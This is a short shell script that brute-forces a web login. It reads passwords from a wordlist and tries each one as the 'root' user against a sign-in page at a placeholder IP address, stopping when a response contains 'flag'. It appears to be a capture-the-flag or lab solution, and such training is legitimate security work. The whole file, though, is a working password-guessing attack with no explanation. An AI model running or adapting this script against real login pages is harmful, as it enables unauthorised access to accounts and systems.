#!/bin/sh
ip_address="{IP}"
input="passwords.txt"
while IFS= read -r line
do
    response=$(curl "http://$ip_address/?page=signin&username=root&password=$line&Login=Login" | grep "flag")
    if [ ! -z "$response" ]; then
        echo "found password is : $line"
        echo $response
        break
    fi
done < "$input"